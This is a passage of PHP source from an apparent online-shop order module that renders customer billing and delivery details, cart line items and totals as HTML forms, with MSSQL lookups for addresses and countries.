<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("company",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][3].'</span></td><td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" >'.$_SESSION["customer_info"][17].'</td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("dic",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][7].'</span></td><td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" >'.$_SESSION["customer_info"][18].'</td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("street",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][4].'</span></td>
<td style="width:35px;" ></td>
<td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" >'.$_SESSION["customer_info"][19].'</td></tr>



<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("city",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][5].'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" >'.$_SESSION["customer_info"][20].'</td></tr>



<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("post_code",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][6].'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" >'.$_SESSION["customer_info"][21].'</td></tr>



<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("country",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.@$_SESSION["customer_info"][10].'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" >'.$_SESSION["customer_info"][22].'</td></tr>



<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("phone",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][8].'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" ></td></tr>


<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("email",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.$_SESSION["customer_info"][9].'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" ></td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("shipping",$_SESSION["language"]).': </span>
</td><td style="align:left;height:22px;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.dictionary(@$_SESSION["customer_info"][11],$_SESSION["language"]).'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" ></td></tr>


<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("payment_terms",$_SESSION["language"]).': </span></td><td style="align:left;" ><span style="padding-left:5px;padding-right:5px;color:black;font-weight:bold;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;" >'.dictionary(@$_SESSION["customer_info"][12],$_SESSION["language"]).'</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:bold;font-size:12px;font-family: arial;" ></td></tr>

<tr><td colspan=5 style="height:10px;" ></td></tr>
<tr><td style="width:684px;" colspan=5 >
<div style="width:100%;color:black;font-weight:bold;font-size:12px;font-family: verdana;" >'.dictionary("merchant_note",$_SESSION["language"]).': </div>
<textarea onchange=parent.prepare_customer_data(); id=reg_value13 name=reg_value13 style="width:100%;overflow:auto;height:70px"  wrap=off >'.str_replace("<br />","\n",$_SESSION["customer_info"][13]).'</textarea>
</td></tr>
</table>
<p></p> 



   
     <table style="width:684px;font-weight: bold;font-size:10px;font-family: verdana;color:black;margin:0px;padding:0px;" >';
    if (@$_SESSION["global_discount"]<>0){$price_column_description=dictionary("price_after_discount",@$_SESSION["language"]);}
        else {$price_column_description=dictionary("price",@$_SESSION["language"]);
        }
    
    $get_data.='<tr style="vertical-align:bottom;text-align:center;">
    <td style="width:30px;">'.dictionary("nr",@$_SESSION["language"]).'</td>
    <td colspan=2 style="width:140px;">'.dictionary("catalogue_number",@$_SESSION["language"]).'</td>
    <td style="width:140px;">'.dictionary("size",@$_SESSION["language"]).'</td>
    <td style="width:54px;" >'.dictionary("measurement_unit",@$_SESSION["language"]).'</td>
    <td style="width:54px;">'.dictionary("quantity",@$_SESSION["language"]).'</td>
    <td style="width:80px;">'.$price_column_description.'</td>
    <td style="width:26px;"></td>
    <td style="width:140px;">'.dictionary("total_price",@$_SESSION["language"]).'</td>
    </tr>';
    $total_amount=0;$total_VAT_amount=0;
    $cykl=0;while(@$_SESSION["product"][$cykl]):
    if (@$_SESSION["global_discount"]<>0){$final_line_price=@$_SESSION["product"][$cykl][4];
    $final_unit_price=@$_SESSION["product"][$cykl][3];}
        else {$final_line_price=@$_SESSION["product"][$cykl][2];$final_unit_price=@$_SESSION["product"][$cykl][12];
        }
        $get_data.='<tr style="vertical-align:bottom;" id=1_count_'.$cykl.' >
        <td style="text-align:center;vertical-align:middle;"><a href=""; onclick="parent.window_change();parent.targeting_selected_unit(\''.$cykl.'\');" style="cursor:pointer;" title="'.dictionary("open_this_product",$_SESSION["language"]).'" >'.($cykl+1).'.</a></td>
        <td colspan=2 style="text-align:left;width:140px;"><input readonly=yes id='.$cykl.'_demand_value1 name='.$cykl.'_demand_value1 value="'.@$_SESSION["product"][$cykl][7].'" type=text style="width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_140_22.png) top left no-repeat;" ></td>
        <td style="text-align:center;"><input readonly=yes id='.$cykl.'_demand_value5 name='.$cykl.'_demand_value5 value="'.@$_SESSION["product"][$cykl][10].'" type=text style="width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_140_22.png) top left no-repeat;" ></td>
        <td style="text-align:center;" ><input readonly=yes id='.$cykl.'_demand_value2 name='.$cykl.'_demand_value2 value="'.@$_SESSION["product"][$cykl][9].'" type=text style="width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_54_22.png) top left no-repeat;" ></td>
        <td style="text-align:center;"><input readonly=yes id='.$cykl.'_demand_value3 onclick=select(); name='.$cykl.'_demand_value3 value="'.@$_SESSION["product"][$cykl][1].'" type=text style="width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_54_22.png) top left no-repeat;" ></td>
        <td style="text-align:center;"><input readonly=yes id='.$cykl.'_demand_value4 name='.$cykl.'_demand_value4 value="'.$final_unit_price.'" type=text style="width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_80_22.png) top left no-repeat;" ></td>
        <td style="text-align:center;"></td>
        <td style="text-align:center;"><input readonly=yes id='.$cykl.'_demand_value6 value="'.@$final_line_price.'" name='.$cykl.'_demand_value6 type=text style="width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_140_22.png) top left no-repeat;" ></td>
        
        </tr>
        <tr style="vertical-align:bottom;" id=2_count_'.$cykl.' ><td colspan=2 style="width:108px;text-align:left;vertical-align:middle;">'.dictionary("note",@$_SESSION["language"]).'</td>
        <td colspan=7 style="text-align:center;" ><input readonly=yes id='.$cykl.'_demand_value7 name='.$cykl.'_demand_value7 value="'.@$_SESSION["product"][$cykl][24].'" type=text style="width:100%;height:22px;border:0px;text-align:left;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_595_22.png) top left no-repeat;" ></td>
        </tr><tr id=3_count_'.$cykl.' ><td colspan=9><p style=height:10px;margin:0px;></p></td></tr>';
        $total_amount=$total_amount+$final_line_price;
        $total_VAT_amount=$total_VAT_amount+$final_line_price;

    $cykl++;endwhile;
        $get_data.='</table>
 <div style="width:100%;height:10px;" > </div>
         <div style="width:100%;color:black;font-weight:bold;font-size:16px;font-family:verdana;" >
         <hr style="width:100%;" >
         <span style="width:315px;text-align:left;" >'.dictionary("total_demand_price",$_SESSION["language"]).'</span><span style="width:189px;text-align:center;color:black;font-weight:bold;font-size:12px;font-family:verdana;" >'.dictionary("total_demand_price_no_vat",$_SESSION["language"]).'</span><span style="width:40px;" > </span><span style="width:140px;text-align:center;color:black;font-weight:bold;font-size:12px;font-family:verdana;" >'.dictionary("total_demand_price_vat",$_SESSION["language"]).'</span>
         <span style="width:315px;text-align:left;" > </span><span style="width:189px;text-aling:center;" ><input readonly=YES id=total_demand_amount type=text style="width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_180_22.png) top left no-repeat;" value="'.@$total_amount.' '.@$_SESSION["Currency_Id"].'" ></span><span style="width:40px;" > </span><span style="width:140px;text-align:center;" ><input readonly=YES id=total_VAT_demand_amount type=text style="width:100%;height:22px;border:0px;text-align:center;padding-top:4px;font-weight:normal;font-size:12px;font-family: arial;background: url(./images/input_140_22.png) top left no-repeat;" value="'.@$total_VAT_amount.' '.@$_SESSION["Currency_Id"].'" ></span>
         </div>        
 <div style="width:100%;height:10px;" > </div>
        </div>
        
<span style="position:absolute;top:9px;left:329px" ><span disabled=disabled title="'.dictionary("demand_step_1",$_SESSION["language"]).'" id=finalize_demand_step1  style="width:90px;height:30px;padding-top:8px;margin-top:0px;cursor:pointer;background: url(./images/demand_start_off.png) no-repeat left top;text-align:center;font-weight:bold;font-size:10px;font-family: verdana;" onmouseout=document.getElementById("finalize_demand_step1").style.background="url(\"./images/demand_start_off.png\")";document.getElementById("finalize_demand_step1").style.color="black"; onmouseover=document.getElementById("finalize_demand_step1").style.background="url(\"./images/demand_start_on.png\")";document.getElementById("finalize_demand_step1").style.color="white"; onclick=parent.prepare_customer_data();parent.check_demand_step("1"); >'.dictionary("demand_step_1",$_SESSION["language"]).'</span><span disabled=disabled title="'.dictionary("demand_step_2",$_SESSION["language"]).'" id=finalize_demand_step2  style="width:104px;height:30px;padding-top:8px;padding-left:7px;margin-left:-16px;margin-top:0px;cursor:pointer;background: url(./images/demand_next_off.png) no-repeat left top;text-align:center;font-weight:bold;font-size:10px;font-family: verdana;" onmouseout=document.getElementById("finalize_demand_step2").style.background="url(\"./images/demand_next_off.png\")";document.getElementById("finalize_demand_step2").style.color="black"; onmouseover=document.getElementById("finalize_demand_step2").style.background="url(\"./images/demand_next_on.png\")";document.getElementById("finalize_demand_step2").style.color="white"; onclick=parent.prepare_customer_data();parent.check_demand_step("2"); >'.dictionary("demand_step_2",$_SESSION["language"]).'</span><span disabled=disabled title="'.dictionary("demand_step_3",$_SESSION["language"]).'" id=finalize_demand_step3  style="width:104px;height:30px;padding-top:8px;padding-left:7px;margin-left:-15px;margin-top:0px;cursor:pointer;background: url(./images/demand_next_on.png) no-repeat left top;text-align:center;font-weight:bold;font-size:10px;font-family: verdana;color:white;" onclick=parent.prepare_customer_data();parent.check_demand_step("3"); >'.dictionary("demand_step_3",$_SESSION["language"]).'</span><span title="'.dictionary("demand_step_4",$_SESSION["language"]).'" id=finalize_demand_step4  style="width:104px;height:30px;padding-top:8px;padding-left:7px;margin-left:-15px;margin-top:0px;cursor:pointer;background: url(./images/demand_next_off.png) no-repeat left top;text-align:center;font-weight:bold;font-size:10px;font-family: verdana;" onmouseout=document.getElementById("finalize_demand_step4").style.background="url(\"./images/demand_next_off.png\")";document.getElementById("finalize_demand_step4").style.color="black"; onmouseover=document.getElementById("finalize_demand_step4").style.background="url(\"./images/demand_next_on.png\")";document.getElementById("finalize_demand_step4").style.color="white"; onclick=parent.prepare_customer_data();parent.check_demand_step("4"); >'.dictionary("demand_step_4",$_SESSION["language"]).'</span></span>
';
 echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><link rel="stylesheet" href="./modules/ckeditor/shadowbox/shadowbox.css" type="text/css" media="screen" /><script src="./modules/ckeditor/shadowbox/shadowbox.js" type="text/javascript"></script><script>Shadowbox.init();var fn_items = new Array();if (document.all){document.onkeydown = function (){if (27==event.keyCode){parent.close_tab();}}}</script>
 <style>
  .fast_window_out{
  opacity: 0.3;
  filter: alpha(opacity=30);
  cursor:pointer;
  margin: 0px;
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:100%;
  background-color:none;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
  
 .fast_window_in{
  opacity: 1;
  filter: alpha(opacity=100);
  cursor:pointer;
  margin: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:100%;
  background-color:#76C1FB;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
  .logout_out{
  color:white;
  font-weight:bold;
  font-size:12px;
  font-family: verdana;
  left:10px;
  opacity: 0.3;
  filter: alpha(opacity=30);
  cursor:pointer;
  margin: 0px;
  margin-top:40px;  
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:79px;
  height:21px;
  text-align:center;
  padding-top:3px;
  background: url(./images/no.png) no-repeat left top;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}
 .logout_in{
  color:white;
  font-weight:bold;
  font-size:12px;
  font-family: verdana;
  left:10px;
  opacity: 1;
  filter: alpha(opacity=100);
  cursor:pointer;
  margin: 0px;
  margin-top:40px;
  padding: 0px;
  padding-right: 4px;
  vertical-align:middle;
  width:79px;
  height:21px;
  text-align:center;
  padding-top:3px;
  background: url(./images/no.png) no-repeat left top;
  -moz-user-select: -moz-none;
  -khtml-user-select: none;
  -webkit-user-select: none;
  -o-user-select: none;
  user-select: none;
}


 </style>
 
 
 </head><body style="width:100%;height:100%;padding:0px;margin:8px;background-image:url(\'./images/body.png\');background-repeat:no-repeat;background-attachment:fixed;background-position:center;" >'.$get_data.'</body><script src="./functions/js/data_list.js" type="text/javascript"></script><script>parent.prepare_customer_data();</script></html>';      
    
}







if (@$_GET["finalize_demand"] == 2 ){
    require_once ("./config/mssql_dbconnect.php");
        @$sql = "SELECT * FROM dbo.[120_registration] WHERE login_name = '".mssecuresql($_SESSION[$sess_id.'logged_user'])."' ";
        //program_log(@$sql,"yes",'sql.log');
        @$check = sqlsrv_query( $conn, $sql , $params, $options );
        @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
        if (@$_SESSION[$sess_id.'logged_user'] && !@$_SESSION["customer_info"][1] ){
        $_SESSION["customer_info"][1] = $row["full_name"];
        $_SESSION["customer_info"][2] = $row["ico"];
        $_SESSION["customer_info"][3] = $row["company"];
        $_SESSION["customer_info"][4] = $row["street"];
        $_SESSION["customer_info"][5] = $row["city"];
        $_SESSION["customer_info"][6] = $row["post_code"];
        $_SESSION["customer_info"][7] = $row["dic"];
        $_SESSION["customer_info"][8] = $row["phone"];
        $_SESSION["customer_info"][9] = $row["email"];
        $_SESSION["customer_info"][10] = $row["country"];
        $_SESSION["customer_info"][11] = $row["shipping"];
        }
$get_data='<div id="request_form" style="font-weight: bold;font-size:18px;font-family: verdana;color:black;" >'.dictionary('finalize_demand',@$_SESSION["language"]).'</div><p></p>
<div style="position: absolute; left: 10px; top: 80px">
<table style="border:0px;width:684px;" border=0px >
<tr><td colspan=2 style="text-align:left;" ><span style="color:black;font-weight:bold;font-size:12px;font-family: verdana;" >'.dictionary("billing_information",$_SESSION["language"]).':</span>
</td><td style="width:35px;text-align:right;" ></td><td colspan=2 style="width:300px;text-align:left;color:black;font-weight:bold;font-size:12px;font-family: verdana;" ><span style="width:119px" >'.dictionary("delivery_address",$_SESSION["language"]).'</span><span style="width:175px;text-align:right;color:black;font-weight:normal;font-size:10px;font-family: verdana;" >(
'.dictionary("different_address",$_SESSION["language"]).': <input ';
if ($_SESSION["customer_info"][0] =="on" ){$get_data.=' checked="checked" '; }
$get_data.=' id=new_delivery_address onclick=parent.delivery_address();parent.prepare_customer_data(); type="checkbox" />)</span></td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("surname",$_SESSION["language"]).",".dictionary("name",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><input onchange=parent.prepare_customer_data(); onclick=select() value="'.$_SESSION["customer_info"][1].'" id=reg_value1 name=reg_value1 type=text style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >
'.dictionary("new",$_SESSION["language"]).' <input onclick=parent.new_delivery_demand_address("DEF"); id=reg_value23 name=reg_value23 ';
if (($_SESSION["customer_info"][23] =="on" && $_SESSION["customer_info"][0] =="on" && @$_SESSION[$sess_id.'logged_user']) || (!@$_SESSION[$sess_id.'logged_user'] && $_SESSION["customer_info"][0] =="on")){$get_data.=' checked="checked" '; }
if ($_SESSION["customer_info"][0] =="" || !@$_SESSION[$sess_id.'logged_user'] ){$get_data.=' disabled="disabled" ';}
$get_data.=' type="checkbox" /><input onchange=parent.prepare_customer_data(); disabled=disabled onclick=select() maxlength="20" value="'.$_SESSION["customer_info"][14].'" id=reg_value14 name=reg_value14 type=text default_value="'.dictionary("new",$_SESSION["language"]).'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:140px;padding-top:4px;text-align:right;height:22px;border:0;background:url(\'./images/input_140_22.png\') no repeat top left;" >
</td></tr>
<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("ic",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><input onclick=select() onchange=parent.prepare_customer_data(); value="'.$_SESSION["customer_info"][2].'" id=reg_value2 name=reg_value2 type=text style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:140px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_140_22.png\') no repeat top left;" ><span style="vertical-align:top;cursor:pointer;margin-left:5px;width:74px;height:22px;margin-top:1px;padding-top:4px;font-weight:bold;font-size:12px;font-family:verdana;text-align:center;color:white;background:url(\'./images/ares.png\') no repeat top left;" unselectable="on" onmouseout="this.style.color=\'white\'" onmouseover="this.style.color=\'#F2DE41\'" onclick="parent.mfcr_check(document.getElementById(\'reg_value2\').value);" >ARES</span></span></td>
<td style="width:35px;" ></td><td rowspan=3 colspan=2 style="text-align:right;vertical-align:top;color:black;font-weight:normal;font-size:12px;font-family: arial;width:300px;border:0;" ><div style="overflow-y:scroll;overflow-x:hidden;width:219px;align:right;vertical-align:top;color:black;font-weight:normal;font-size:12px;font-family: arial;padding-top:4px;height:80px;border:0;background:url(\'./images/yellow_219_80.png\') repeat left top;" >
';
//delivery list
@$sql1 = "SELECT * FROM [dbo].[120_delivery_address] WHERE registration_id = '".mssecuresql($row["id"])."'ORDER BY delivery_address_name ASC";
@$check1 = sqlsrv_query( $conn, $sql1 , $params, $options );
$cycle=1;
while( @$row1 = sqlsrv_fetch_array( @$check1, SQLSRV_FETCH_BOTH ) ) {
    $get_data.='<div onclick=parent.load_delivery_demand_address("'.$row1["id"].'"); unselectable="on" id=dev_addr'.$cycle.' ';
    if (!@$_SESSION["customer_info"][0]){$get_data.= " disabled=disabled ";}
    $get_data.='class="fast_window_out" onmouseout="className=\'fast_window_out\';" onmouseover="className=\'fast_window_in\';" >'.$row1["delivery_address_name"].'</div>';
    $cycle++;
}
$get_data.='</td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("company",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><input onclick=select() onchange=parent.prepare_customer_data(); value="'.$_SESSION["customer_info"][3].'" id=reg_value3 name=reg_value3 type=text style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span></td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("dic",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><input onclick=select() onchange=parent.prepare_customer_data(); value="'.$_SESSION["customer_info"][7].'" id=reg_value7 name=reg_value7 type=text style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span></td></tr>

<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("street",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><input onclick=select() onchange=parent.prepare_customer_data(); value="'.$_SESSION["customer_info"][4].'" id=reg_value4 name=reg_value4 type=text style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span></td>
<td style="width:35px;" ></td>
<td colspan=2 style="width:300px;text-align:right;" >
<span><input ';
if (!@$_SESSION["customer_info"][0]){$get_data.= " disabled=disabled ";}
$get_data.=' onclick=select() onchange=parent.prepare_customer_data(); value="'.$_SESSION["customer_info"][15].'" id=reg_value15 name=reg_value15 type=text default_value="'.dictionary("surname",$_SESSION["language"]).",".dictionary("name",$_SESSION["language"]).':"  style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span>
</td>
</tr>



<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("city",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><input onclick=select() onchange=parent.prepare_customer_data(); value="'.$_SESSION["customer_info"][5].'" id=reg_value5 name=reg_value5 type=text style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;" >
<span><input ';
if (!@$_SESSION["customer_info"][0]){$get_data.= " disabled=disabled ";}
$get_data.=' onclick=select() onchange=parent.prepare_customer_data(); value="'.$_SESSION["customer_info"][16].'" id=reg_value16 name=reg_value16 type=text default_value="'.dictionary("company",$_SESSION["language"]).'"  style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span>
</td>
</tr>



<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("post_code",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><input onclick=select() onchange=parent.prepare_customer_data(); value="'.$_SESSION["customer_info"][6].'" id=reg_value6 name=reg_value6 type=text style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;" >
<span><input ';
if (!@$_SESSION["customer_info"][0]){$get_data.= " disabled=disabled ";}
$get_data.=' onclick=select() onchange=parent.prepare_customer_data(); value="'.$_SESSION["customer_info"][17].'" id=reg_value17 name=reg_value17 type=text default_value="'.dictionary("street",$_SESSION["language"]).'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span>
</td>
</tr>



<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("country",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><select onchange=parent.prepare_customer_data(); id=reg_value10 name=reg_value10 style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" >';
        @$sql1 = "SELECT country FROM [dbo].[120_country] ORDER BY country";
        @$check1 = sqlsrv_query( $conn, $sql1 , $params, $options );
        while( @$row1 = sqlsrv_fetch_array( @$check1, SQLSRV_FETCH_BOTH ) ) {
            $get_data.='<option value="'.@$row1[0].'" ';
            if (@$_SESSION["customer_info"][10]){
                if ($_SESSION["customer_info"][10]==@$row1[0]){$get_data.=' selected=selected ';} 
            }else {
                if ($row["country"]==@$row1[0] ) {$get_data.=' selected=selected ';}
            } 
            $get_data.=' > '.@$row1[0].'</option>';    
        }
$get_data.='</select>
</span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;" >
<span><input ';
if (!@$_SESSION["customer_info"][0]){$get_data.= " disabled=disabled ";}
$get_data.=' onclick=select() onchange=parent.prepare_customer_data(); value="'.$_SESSION["customer_info"][18].'" id=reg_value18 name=reg_value18 type=text default_value="'.dictionary("city",$_SESSION["language"]).'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span>
</td>
</tr>



<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("phone",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><input onclick=select() onchange=parent.prepare_customer_data(); value="'.$_SESSION["customer_info"][8].'" id=reg_value8 name=reg_value8 type=text style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;" >
<span><input ';
if (!@$_SESSION["customer_info"][0]){$get_data.= " disabled=disabled ";}
$get_data.=' onclick=select() onchange=parent.prepare_customer_data(); value="'.$_SESSION["customer_info"][19].'" id=reg_value19 name=reg_value19 type=text default_value="'.dictionary("post_code",$_SESSION["language"]).'" style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span>
</td>
</tr>



<tr><td style="width:120px;" >
<span style="width:120px;color:black;font-weight:normal;font-size:12px;font-family: verdana;" >'.dictionary("email",$_SESSION["language"]).': </span>
</td><td style="align:left;" ><span><input onclick=select() onchange=parent.prepare_customer_data(); value="'.$_SESSION["customer_info"][9].'" id=reg_value9 name=reg_value9 type=text style="padding-left:5px;padding-right:5px;color:black;font-weight:normal;font-size:12px;font-family: arial;width:219px;padding-top:4px;height:22px;border:0;background:url(\'./images/input_219_22.png\') no repeat top left;" ></span></td>
<td style="width:35px;" ></td><td colspan=2 style="width:300px;text-align:right;" >
<span>

<select ';
if (!@$_SESSION["customer_info"][0]){$get_data.= " disabled=disabled ";}
